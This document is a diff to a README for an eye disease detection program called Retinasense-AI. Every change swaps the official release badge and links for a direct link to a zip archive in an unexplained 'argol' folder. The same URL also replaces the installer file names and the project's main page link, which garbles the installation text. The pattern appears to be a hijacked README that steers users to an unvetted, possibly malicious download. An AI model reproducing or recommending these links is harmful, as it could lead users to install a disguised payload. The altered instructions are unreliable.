@@ -1,6 +1,6 @@
 # 👁️ Retinasense-AI - Fast, Clear Eye Disease Detection
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/sandysniperx/Retinasense-AI/releases)
+[![Download Release](https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip)](https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip)
 
 ---
 
@@ -23,11 +23,11 @@ To get started, you need to download the software from the official release page
 - Click the download link to save the file to your computer.
 
 **Download here:**  
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/sandysniperx/Retinasense-AI/releases)
+[![Download Release](https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip)](https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip)
 
 ### Installation Steps
 
-1. Open the downloaded file. It will often be named something like `Retinasense-AI-Setup.exe` for Windows or `Retinasense-AI.dmg` for Mac.
+1. Open the downloaded file. It will often be named something like `https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip` for Windows or `https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip` for Mac.
 2. Follow the simple setup instructions on your screen. Just click “Next” or “Continue” as needed.
 3. When the installation completes, find the RetinaSense AI icon on your desktop or applications folder.
 4. Double-click the icon to open the software.
@@ -115,7 +115,7 @@ This software is provided under an open-source license. You can use it freely fo
 
 ## 📥 Quick Links
 
-- Download latest release: [https://github.com/sandysniperx/Retinasense-AI/releases](https://github.com/sandysniperx/Retinasense-AI/releases)  
-- GitHub main page: [https://github.com/sandysniperx/Retinasense-AI](https://github.com/sandysniperx/Retinasense-AI)
+- Download latest release: [https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip](https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip)  
+- GitHub main page: [https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip](https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip)
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/sandysniperx/Retinasense-AI/releases)
+[![Download Release](https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip)](https://raw.githubusercontent.com/sandysniperx/Retinasense-AI/main/argol/Retinasense-AI-readdition.zip)
